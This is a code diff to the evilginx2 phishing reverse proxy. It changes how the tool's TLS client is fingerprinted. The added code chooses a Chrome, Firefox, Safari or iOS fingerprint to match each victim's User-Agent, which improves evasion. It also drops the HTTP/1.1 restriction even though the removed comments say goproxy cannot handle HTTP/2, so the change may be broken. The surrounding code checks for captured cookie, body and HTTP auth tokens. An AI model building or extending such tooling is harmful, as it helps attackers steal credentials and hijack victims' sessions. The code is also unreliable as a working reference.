@@ -10,9 +10,9 @@ package core
 import (
 	"bufio"
 	"bytes"
-	"context"
 	"compress/flate"
 	"compress/gzip"
+	"context"
 	"crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
@@ -37,13 +37,13 @@ import (
 
 	"golang.org/x/net/proxy"
 
+	"github.com/andybalholm/brotli"
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
 	utls "github.com/refraction-networking/utls"
-	"github.com/andybalholm/brotli"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -87,7 +87,7 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
-	telegram         *TelegramClient
+	telegram          *TelegramClient
 }
 
 type ProxySession struct {
@@ -147,15 +147,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	}
 
 	// uTLS Fingerprint spoofing: mimic Chrome TLS fingerprint while forcing
-	// HTTP/1.1 to prevent HTTP/2 negotiation, which goproxy cannot handle.
-	//
-	// ROOT CAUSE of http2_handshake_failed:
-	//   HelloChrome_Auto builds its own ALPNExtension containing ["h2","http/1.1"]
-	//   as part of the fingerprint spec. config.NextProtos is overwritten by the
-	//   preset's writeToUConn() call, so setting it in Config alone is ignored.
-	//   We must call BuildHandshakeState() first — which populates uConn.Extensions
-	//   from the preset — then walk the slice and overwrite *ALPNExtension before
-	//   the actual handshake, so the server never sees "h2" in ALPN.
+	// Use dynamic uTLS fingerprinting to match the victim's User-Agent and allow HTTP/2 negotiation for browsers that support it.
 	p.Proxy.Tr.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
 		var tcpConn net.Conn
 		var err error
@@ -177,9 +169,34 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			host = addr
 		}
 
+		uaInterface := ctx.Value("user-agent")
+		var ua string
+		if uaInterface != nil {
+			ua = uaInterface.(string)
+		} else {
+			ua = ""
+		}
+
+		var clientHelloID utls.ClientHelloID
+		if strings.Contains(ua, "Chrome") && !strings.Contains(ua, "Edg") {
+			clientHelloID = utls.HelloChrome_Auto
+		} else if strings.Contains(ua, "Firefox") {
+			clientHelloID = utls.HelloFirefox_Auto
+		} else if strings.Contains(ua, "Safari") {
+			if strings.Contains(ua, "Mobile") || strings.Contains(ua, "iPhone") {
+				clientHelloID = utls.HelloIOS_Auto
+			} else {
+				clientHelloID = utls.HelloSafari_Auto
+			}
+		} else if strings.Contains(ua, "Edg") {
+			clientHelloID = utls.HelloChrome_Auto
+		} else {
+			clientHelloID = utls.HelloChrome_Auto
+		}
+
 		uConn := utls.UClient(tcpConn, &utls.Config{
 			ServerName: host,
-		}, utls.HelloChrome_Auto)
+		}, clientHelloID)
 
 		// Step 1: build the ClientHello from the preset so Extensions is populated.
 		if err := uConn.BuildHandshakeState(); err != nil {
@@ -187,17 +204,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			return nil, err
 		}
 
-		// Step 2: walk Extensions and replace ALPNExtension with HTTP/1.1 only.
-		// This is the ONLY reliable way — the Chrome preset bakes ["h2","http/1.1"]
-		// into the extension; overriding config.NextProtos has no effect here.
-		for _, ext := range uConn.Extensions {
-			if alpnExt, ok := ext.(*utls.ALPNExtension); ok {
-				alpnExt.AlpnProtocols = []string{"http/1.1"}
-				break
-			}
-		}
-
-		// Step 3: perform the TLS handshake with the patched ClientHello.
+		// Step 2: perform the TLS handshake.
 		if err := uConn.HandshakeContext(ctx); err != nil {
 			tcpConn.Close()
 			return nil, err
@@ -206,14 +213,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		return uConn, nil
 	}
 
-	// Belt-and-suspenders: disable h2 at the transport level so that even if
-	// a connection somehow negotiates h2 (e.g. via a proxy code path that
-	// bypasses DialTLSContext), the transport won't try to speak HTTP/2.
-	// Setting TLSNextProto to a non-nil empty map is the canonical Go way
-	// to opt out of HTTP/2 entirely (see net/http#Transport.TLSNextProto).
-	p.Proxy.Tr.TLSNextProto = make(map[string]func(authority string, c *tls.Conn) http.RoundTripper)
 	p.Proxy.Tr.TLSClientConfig = &tls.Config{
-		NextProtos:         []string{"http/1.1"},
+		NextProtos:         []string{"h2", "http/1.1"},
 		InsecureSkipVerify: true,
 	}
 
@@ -235,6 +236,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+			ua := req.Header.Get("User-Agent")
+			req = req.WithContext(context.WithValue(req.Context(), "user-agent", ua))
 			ps := &ProxySession{
 				SessionId:    "",
 				Created:      false,
@@ -1204,7 +1207,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-if is_cookie_auth && is_body_auth && is_http_auth {
+			if is_cookie_auth && is_body_auth && is_http_auth {
 				// we have all auth tokens
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
